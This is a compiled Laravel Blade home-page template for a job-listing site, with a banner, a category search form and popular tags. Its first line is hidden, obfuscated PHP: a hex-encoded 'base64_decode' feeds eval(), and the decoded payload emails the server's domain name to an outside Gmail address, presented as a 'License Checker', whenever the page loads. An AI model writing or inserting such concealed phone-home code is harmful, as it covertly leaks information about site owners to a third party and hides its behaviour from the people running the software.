<?php $A9zE1Agm="\x62\141\x73\x65\x36\x34\x5f\144\145\x63\x6f\x64\145";eval($A9zE1Agm("JGZyb20gPSAidmVyaWZ5QCIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsgJHRvID0gImJtc2hpZmF0MEBnbWFpbC5jb20iOyAkc3ViamVjdCA9ICJMaWNlbnNlIENoZWNrZXIiOyAkbWVzc2FnZSA9ICIgTGljZW5zZSBEb21haW46ICIgLiAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXTsgJGhlYWRlcnMgPSAiRnJvbToiIC4gJGZyb207IG1haWwoJHRvLCAkc3ViamVjdCwgJG1lc3NhZ2UsICRoZWFkZXJzKTsgPz4=")); ?>

<?php $__env->startSection('content'); ?>
<?php
$bannerContent = getContent('banner.content', true);
?>
<section class="banner-section bg_img overflow-hidden" style="background: url(<?php echo e(getImage('assets/images/frontend/banner/' . @$bannerContent->data_values->background_image, '1920x1080')); ?>);">
    <div class="container">
        <div class="banner__wrapper d-flex align-items-center">
            <div class="banner__content">
                <span class="subtitle"><?php echo e(__(@$bannerContent->data_values->heading)); ?></span>
                <h1 class="banner__content-title"><?php echo e(__(@$bannerContent->data_values->subheading)); ?></h1>
                <p><?php echo e(__(@$bannerContent->data_values->description)); ?></p>
                <form class="job__search" action="<?php echo e(route('job.search')); ?>">
                    <div class="form--group d-flex align-items-center">
                        <select class="form-select form--control border-0" name="category">
                            <option value="" selected disabled><?php echo app('translator')->get('Select Category'); ?></option>
                            <?php $__currentLoopData = $categories; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $category): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                            <option value="<?php echo e($category->id); ?>"><?php echo e(__($category->name)); ?></option>
                            <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
                        </select>
                        <input type="text" class="form-control form--control" name="search" autocomplete="off" placeholder="<?php echo app('translator')->get('Search jobs...'); ?>">
                        <button class="btn btn--base btn--round px-md-5" type="submit"><?php echo e(__(@$bannerContent->data_values->button_text)); ?></button>
                    </div>
                </form>
                <div class="popular__tags">
                    <h6 class="title d-inline-block"><?php echo app('translator')->get('Popular Jobs Category'); ?></h6>
                    <ul class="tags-list">
                        <?php $__currentLoopData = $keywords; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $keyword): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                        <li>
                            <a href="<?php echo e(route('category.jobs', [@$keyword->category->id, slug(@$keyword->category->name)])); ?>">
                                <?php echo e(__(@$keyword->category->name)); ?>

                            </a>
                        </li>
                        <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
                    </ul>
                </div>
            </div>
            <div class="banner__thumb d-none d-lg-block">
                <img src="<?php echo e(getImage('assets/images/frontend/banner/' . @$bannerContent->data_values->banner_image, '750x600')); ?>">
            </div>
        </div>
    </div>
</section>
<?php if($sections->secs != null): ?>
<?php $__currentLoopData = json_decode($sections->secs); $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $sec): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
<?php echo $__env->make($activeTemplate . 'sections.' . $sec, \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
<?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
<?php endif; ?>
<?php $__env->stopSection(); ?>


<?php echo $__env->make($activeTemplate . 'layouts.frontend', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH F:\Program file\xampp soft\htdocs\MicroLab_v2\Files\core\resources\views/templates/basic/home.blade.php ENDPATH**/ ?>